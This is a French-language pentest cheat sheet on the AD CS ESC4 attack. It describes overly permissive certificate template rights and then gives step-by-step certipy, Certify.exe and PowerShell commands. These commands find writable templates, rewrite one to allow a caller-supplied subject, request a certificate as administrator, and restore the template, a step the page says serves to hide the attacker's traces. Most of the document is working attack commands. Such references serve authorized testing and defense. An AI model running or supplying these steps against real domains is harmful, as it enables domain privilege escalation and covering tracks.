### Description

ESC4 exploite des permissions trop permissives sur les modèles de certificats, permettant à un utilisateur d'écrire ou de modifier un modèle existant pour le rendre vulnérable (par exemple, pour créer une condition ESC1 ou ESC2 artificielle).

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC4 si :

1. **Permissions d'écriture accordées** - L'utilisateur a les droits `WriteProperty`, `WriteOwner`, `WriteDacl`, ou `FullControl`
2. **Template modifiable** - Le modèle peut être modifié pour devenir exploitable
3. **Enrollment possible** - L'utilisateur peut ensuite utiliser le modèle modifié via les droits `Enroll`
4. **Restauration possible** - L'attaquant peut potentiellement restaurer la configuration originale pour masquer ses traces

---

### Exploitation depuis linux (certipy)

Enumération des templates vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec sortie JSON pour analyse détaillée des permissions
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique des permissions d'écriture
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A10 -B5 "WriteProperty\|WriteOwner\|WriteDacl"
```

Modification du template pour le rendre exploitable :

```bash
# Sauvegarde de la configuration originale
certipy template -u user@domain.local -p password -target dc01.domain.local -template 'VulnerableTemplate' -save-old

# Modification du template pour activer ESC1
certipy template -u user@domain.local -p password -target dc01.domain.local -template 'VulnerableTemplate' -enable-enrollee-supplies-subject
```

Exploitation du template modifié :

```bash
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'VulnerableTemplate' -upn administrator@domain.local
```

Restauration du template :

```bash
certipy template -u user@domain.local -p password -target dc01.domain.local -template 'VulnerableTemplate' -configuration saved_config.json
```

---

### Exploitation depuis windows (certify.exe + PowerShell)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Recherche spécifique des permissions d'écriture
Certify.exe find /vulnerable | findstr "WriteProperty\|WriteOwner\|WriteDacl\|FullControl"
```

Modification du template via PowerShell :

```powershell
# Import du module Active Directory
Import-Module ActiveDirectory

# Sauvegarde de la configuration originale
$template = Get-ADObject -Identity "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Properties *
$template | Export-Clixml -Path "template_backup.xml"

# Modification pour activer ESC1
Set-ADObject -Identity "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Replace @{'msPKI-Certificate-Name-Flag'=1}
```

Faire la demande de certificat :

```powershell
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:VulnerableTemplate /subject:"CN=administrator,CN=Users,DC=domain,DC=local"
```

Restauration du template :

```powershell
$originalTemplate = Import-Clixml -Path "template_backup.xml"
Set-ADObject -Identity "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Replace @{'msPKI-Certificate-Name-Flag'=$originalTemplate.'msPKI-Certificate-Name-Flag'}
```
